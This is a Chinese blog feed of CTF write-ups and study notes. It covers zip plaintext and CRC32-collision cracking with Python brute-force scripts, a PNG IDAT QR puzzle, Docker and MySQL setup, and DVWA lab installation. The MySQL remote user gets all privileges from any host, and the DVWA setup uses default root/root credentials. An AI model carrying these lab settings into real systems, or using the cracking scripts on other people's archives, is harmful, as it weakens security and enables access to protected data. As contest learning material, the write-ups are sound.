src="/2023/04/27/FCTF/image-20230430144651066.png"></p><p>相信不止我一个人遇到这种情况。。。这里我们忽略了一些细节，加密文件是通过什么方式压缩的呢？不同压缩软件采用的压缩算法也会不同，自然会出现不匹配的情况，这里多尝试几次，鼠标右键发送到压缩文件可行，开始明文攻击</p><p><img src="/2023/04/27/FCTF/image-20230430145433930.png"></p><p><img src="/2023/04/27/FCTF/image-20230430145615362.png"></p><p>等待了一段时间之后拿到秘钥(btw这一坨是啥。。。)</p><p><img src="/2023/04/27/FCTF/image-20230430150510674.png"></p><p>第四层：</p><p>字典、明文、伪加密，各种姿势都试过了，打开压缩包看一眼，分散成这么多小文件，大胆猜测CRC碰撞</p><p><img src="/2023/04/27/FCTF/image-20230430152951249.png"></p><p>EXIF查看一下压缩文件数据，CRC32、字节数等等</p><p><img src="/2023/04/27/FCTF/image-20230430153333151.png"></p><p>大致整理下6个文本文件的CRC32、字节数：</p><table><thead><tr><th align="center">文件名</th><th align="center">CRC32</th><th align="center">字节数</th></tr></thead><tbody><tr><td align="center">1.txt</td><td align="center">0x92716b7c</td><td align="center">5</td></tr><tr><td align="center">2.txt</td><td align="center">0x1ab6bb72</td><td align="center">4</td></tr><tr><td align="center">3.txt</td><td align="center">0xfcf21afd</td><td align="center">3</td></tr><tr><td align="center">4.txt</td><td align="center">0x89a155cb</td><td align="center">5</td></tr><tr><td align="center">5.txt</td><td align="center">0x2d09a3d6</td><td align="center">6</td></tr><tr><td align="center">6.txt</td><td align="center">0xe3f20a9d</td><td align="center">2</td></tr></tbody></table><p>1-3字节的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1byte</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0xda6fd2a0</span>, <span class="hljs-number">0xf6a70</span>, <span class="hljs-number">0x70659eff</span>, <span class="hljs-number">0x862575d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            char_crc = binascii.crc32(char1.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>            calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将获取到的字符的CRC32值与0xffffffff进行与运算</span><br>            <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将每个字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),char1))<br>                comment += char1<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">2bytes</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0xe3f20a9d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            <span class="hljs-keyword">for</span> char2 <span class="hljs-keyword">in</span> chars:<br>                res_char = char1 + char2<span class="hljs-comment">#获取遍历的任意2Byte字符</span><br>                char_crc = binascii.crc32(res_char.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>                calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将获取到的字符的CRC32值与0xffffffff进行与运算</span><br>                <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),res_char))<br>                    comment += res_char<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430160710583.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">3bytes</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0x92716b7c</span>, <span class="hljs-number">0x1ab6bb72</span>, <span class="hljs-number">0xfcf21afd</span>, <span class="hljs-number">0x89a155cb</span>, <span class="hljs-number">0x2d09a3d6</span>, <span class="hljs-number">0xe3f20a9d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            <span class="hljs-keyword">for</span> char2 <span class="hljs-keyword">in</span> chars:<br>                <span class="hljs-keyword">for</span> char3 <span class="hljs-keyword">in</span> chars:<br>                    res_char = char1 + char2 + char3<span class="hljs-comment">#获取遍历的任意3Byte字符</span><br>                    char_crc = binascii.crc32(res_char.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>                    calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将遍历的字符的CRC32值与0xffffffff进行与运算</span><br>                    <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),res_char))<br>                        comment += res_char<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430160744568.png"></p><p>4-6字节的使用<a href="https://github.com/theonlypwner/crc32">theonlypwner</a>工具，修改供选字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">permitted_characters = <span class="hljs-built_in">set</span>(<br>    <span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>, <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;!&#x27;</span>))  <span class="hljs-comment"># \w</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430161138948.png"></p><p><code>FTCF&#123;</code></p><p><img src="/2023/04/27/FCTF/image-20230430161219428.png"></p><p><code>Y0u_</code></p><p><img src="/2023/04/27/FCTF/image-20230430161254433.png"></p><p><code>_z1p_</code></p><p><img src="/2023/04/27/FCTF/image-20230430161318849.png"></p><p><code>master</code></p><p>拼接起来就是<code>FTCF&#123;Y0u_4re_z1p_master!&#125;</code></p><p>使用theonlypwner时出了点问题，最开始忘记了flag中必含的”{“”}”字符，导致怎么都跑不出来，还是看了眼hint想起来应该修改脚本中的供选字符。如果感叹号是在4-6字节的那些文件的话肯定也跑不出来了，考虑问题还是不够周到。</p><p>（大佬的博客：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html</a>）</p><p>（CTFwiki：<a href="https://ctf-wiki.org/misc/archive/zip/#_7%EF%BC%89">https://ctf-wiki.org/misc/archive/zip/#_7）</a></p><hr><h2 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h2><h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h4><p>附件如图所示：</p><p><img src="/2023/04/27/FCTF/image-20230519013136127.png"></p><p>一整张图构成极其简单，想要藏什么数据的话大概率只能是IDAT块隐写了，pngcheck查看下</p><p><img src="/2023/04/27/FCTF/image-20230519013017814.png"></p><p>9个IDAT块，块长度没有隐藏什么特殊信息，一张正常的png图片的IDAT块的前面的块应该都是填充满且相同大小的，这个check结果显然就不正常，感觉每一个块都单独成图。试着删除块。</p><p>tweakpng：</p><p><img src="/2023/04/27/FCTF/image-20230519013824840.png"></p><p>准备删IDAT块，九个块就拷贝九份先。删块的时候不要把IEND块删了，这是png格式的结尾标识。</p><p>每个IDAT块单独成一张图片，已经很明显了，是一张二维码。</p><p><img src="/2023/04/27/FCTF/image-20230519014312145.png"></p><p>自己对于二维码结构的认知只有三个定位块（悲），所以瞎拼，然后都没法扫（，根据学长放的<a href="https://www.cnblogs.com/mq0036/p/14445719.html">hint</a>：</p><p><img src="/2023/04/27/FCTF/image-20230519021831370.png"></p><p><img src="/2023/04/27/FCTF/image-20230519021849222.png"></p><p>归纳就是三个定位块的周围一个像素块的一圈必须是空白的，且相互之间有黑白像素块交叉分布的定时标志，根据特征拿到ps里拼了下</p><p><img src="/2023/04/27/FCTF/image-20230519022132076.png"></p><p>扫一下，拿到flag：</p><p><code>FCTF&#123;n1ce_puzzl3&#125;</code></p><h4 id="自信音游人"><a href="#自信音游人" class="headerlink" title="自信音游人"></a>自信音游人</h4><p>附件是给的曲目选自阿卡伊的だいあるのーと。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
      <tag>ssrf</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_note</title>
    <link href="/2023/04/24/java-note/"/>
    <url>/2023/04/24/java-note/</url>
    
    <content type="html"><![CDATA[<h1 id="浅记Java学习记录"><a href="#浅记Java学习记录" class="headerlink" title="浅记Java学习记录"></a>浅记Java学习记录</h1><p>JRE：运行Java字节码的虚拟机</p><p>JDK：如果只有Java源码，要编译成Java字节码，就需要JDK，因为JDK除了包含JRE，还提供了编译器、调试器等开发工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ascii"> ┌─    ┌──────────────────────────────────┐<br> │     │     Compiler, debugger, etc.     │<br> │     └──────────────────────────────────┘<br>JDK ┌─ ┌──────────────────────────────────┐<br> │  │  │                                  │<br> │ JRE │      JVM + Runtime Library       │<br> │  │  │                                  │<br> └─ └─ └──────────────────────────────────┘<br>       ┌───────┐┌───────┐┌───────┐┌───────┐<br>       │Windows││ Linux ││ macOS ││others │<br>       └───────┘└───────┘└───────┘└───────┘<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字RCE</title>
    <link href="/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/"/>
    <url>/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_note</title>
    <link href="/2023/04/05/docker-note/"/>
    <url>/2023/04/05/docker-note/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker学习记录"><a href="#Docker学习记录" class="headerlink" title="Docker学习记录"></a>Docker学习记录</h1><p>Windows上一定要先安装WSL。</p><h2 id="复现CTF赛题环境"><a href="#复现CTF赛题环境" class="headerlink" title="复现CTF赛题环境"></a>复现CTF赛题环境</h2><p>作为一名CTF萌新，一切的一切的一切先从如何复现环境开始（</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给了Dockerfile的情况</span><br>docker build -t &lt;容器名&gt; .#注意这里最后有个&quot;.&quot;不能省略<br>docker run -idP &lt;容器名&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给了docker-compose.yml的情况</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo service docker status#查看docker运行状态<br>sudo service docker start#启动docker<br></code></pre></td></tr></table></figure><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run ubuntu:20.04 /bin/echo &quot;hello world&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">run 代表运行一个容器，unbuntu:20.04代表镜像(images)，由ubuntu:20.04镜像创建一个新的容器并运行。后面的/bin/echo代表执行该容器/bin/下的<span class="hljs-built_in">echo</span>命令</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151409875.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it ubuntu:20.04 /bin/bash<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-i：允许容器内的标准输出进行交互</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-t：在新容器内指定一个伪终端或终端</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果不存在该镜像则自动拉取安装一个</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151607565.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入容器之后想退出</span><br>root@&lt;容器ID&gt;:/# exit<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151900721.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d ubuntu:20.04 /bin/echo &quot;hello world&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-d表示在后台运行</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">上述指令执行完之后并没有回显<span class="hljs-string">&quot;hello world&quot;</span>,而是显示容器的ID，说明容器被启动</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152208455.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker ps#查看正在运行的容器<br>docker ps -a#查看所有容器<br>docker ps -l#查看最后一次创建的容器<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152453409.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker logs &lt;ID/容器名&gt; #查看容器标准输出<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152752058.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop &lt;ID/容器名&gt;#停止容器<br>docker restart &lt;ID/容器名&gt;#重启容器<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull &lt;镜像名&gt;#拉取镜像<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -itd --name &lt;容器名&gt; &lt;镜像名&gt; /bin/bash<br><span class="hljs-meta prompt_">#</span><span class="language-bash">希望容器在后台运行，并给该容器命名</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">要注意的是加上<span class="hljs-string">&quot;-d&quot;</span>默认在后台运行不进入容器，要进入容器用docker attach或docker <span class="hljs-built_in">exec</span></span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153402534.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker attach &lt;ID/容器名&gt;#进入容器，exit后容器停止<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153636733.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it &lt;ID/容器名&gt; /bin/bash#exit之后容器在后台运行不关闭<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153831456.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker export &lt;ID/容器名&gt; &gt; ./ubuntu.tar#向当前目录导出某个容器<br>cat ./ubuntu.tar | docker import -&lt;容器名&gt;:&lt;tag&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rm -f &lt;ID/容器名&gt; #删除某容器<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rename &lt;old_name&gt; &lt;new_name&gt;#重命名某容器<br></code></pre></td></tr></table></figure><h3 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -P training/webapp python app.py<br><span class="hljs-meta prompt_">#</span><span class="language-bash">大写的-P代表随机映射一个端口</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405154618159.png"></p><p>访问本地32768端口</p><p><img src="/2023/04/05/docker-note/image-20230405154729584.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">小写的-p代表指定映射的ip和端口，但是在一个指定端口上只能绑定一个容器</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">格式：hostPort:containerPort、ip:hostPort:containerPort、ip::containerPort</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405155352141.png"></p><p>访问本地23333端口</p><p><img src="/2023/04/05/docker-note/image-20230405155430720.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker logs &lt;ID/容器名&gt;#查看截止当前的web应用日志（静态）<br>docker logs -f &lt;ID/容器名&gt;#查看实时web日志（动态）<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405155849636.png"></p><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rmi &lt;镜像名&gt;#删除镜像，rmi中的i是images的意思<br>docker images#查看镜像，复现Dockerfile第一步命令后可以用一下看看是否创建成功镜像<br></code></pre></td></tr></table></figure><hr><h2 id="Docker-部署-MySQL"><a href="#Docker-部署-MySQL" class="headerlink" title="Docker 部署 MySQL"></a>Docker 部署 MySQL</h2><p>先pull一个镜像</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker pull mysql<br></code></pre></td></tr></table></figure><p><code>docker images</code>可以查看是否成功拉取镜像</p><p>创建容器并进行端口映射：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -p &lt;port&gt;:3306 --name &lt;容器名&gt; -e MYSQL_ROOT_PASSWORD=&lt;密码&gt; mysql</span><br></code></pre></td></tr></table></figure><p><code>docker ps</code>可以查看是否成功创建容器</p><p>启动容器：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker start &lt;容器名/ID&gt;<br></code></pre></td></tr></table></figure><p>容器启动后，进入容器：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker exec -it &lt;容器名/ID&gt; /bin/bash<br></code></pre></td></tr></table></figure><p>进入MySQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u root -p &lt;密码&gt;<br></code></pre></td></tr></table></figure><p>修改新密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;&lt;新密码&gt;&#x27;;<br></code></pre></td></tr></table></figure><p>开启MySQL远程连接权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE USER &lt;用户名&gt; IDENTIFIED BY &#x27;&lt;远程密码&gt;&#x27;;#创建远程用户<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;&lt;用户名&gt;&#x27;@&#x27;%&#x27;;#分配权限<br>FLUSH PRIVILEGES;#刷新权限<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2023/03/28/DVWA/"/>
    <url>/2023/03/28/DVWA/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建DVWA靶场"><a href="#搭建DVWA靶场" class="headerlink" title="搭建DVWA靶场"></a>搭建DVWA靶场</h1><h2 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h2><p>(1)<a href="https://blog.csdn.net/qq_44803335/article/details/108806851">本地配置好php环境</a></p><p>(2)下载DVWA源码：<a href="https://github.com/digininja/DVWA/archive/master.zip">https://github.com/digininja/DVWA/archive/master.zip</a></p><h2 id="具体步骤："><a href="#具体步骤：" class="headerlink" title="具体步骤："></a>具体步骤：</h2><p>1、下载并安装PHPstudy；</p><p>2、将解压后的DVWA源码放置在phpstudy安装目录的WWW文件夹；</p><p><img src="/2023/03/28/DVWA/image-20230406231241712.png"></p><p>3.进入DVWA&#x2F;config目录，将config.inc.php.dist最后的.dist删去；</p><p>4、打开刚刚重命名的config.inc.php文件，修改db_user和db_password为”root”、”root”；</p><p><img src="/2023/03/28/DVWA/image-20230406231943662.png"></p><p>5、PHPstudy中启动服务器，访问<a href="http://127.0.0.1/DVWA/setup.php">http://127.0.0.1/DVWA/setup.php</a>(或<a href="http://localhost/DVWA/setup.php">http://localhost/DVWA/setup.php)</a>)点击最下方的Creat Database；</p><p><img src="/2023/03/28/DVWA/image-20230406232851826.png"></p><p>如图所示就算启动成功了。</p><p>6、访问<a href="http://127.0.0.1/DVWA/">http://127.0.0.1/DVWA/</a>(或<a href="http://localhost/DVWA/">http://localhost/DVWA/)</a>)，输入用户名”admin”密码”password”登录即可</p><h1 id="DVWA靶场学习记录"><a href="#DVWA靶场学习记录" class="headerlink" title="DVWA靶场学习记录"></a>DVWA靶场学习记录</h1>]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>自建靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit</title>
    <link href="/2023/03/28/Metasploit/"/>
    <url>/2023/03/28/Metasploit/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>渗透工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF</title>
    <link href="/2023/03/11/NSSCTF/"/>
    <url>/2023/03/11/NSSCTF/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
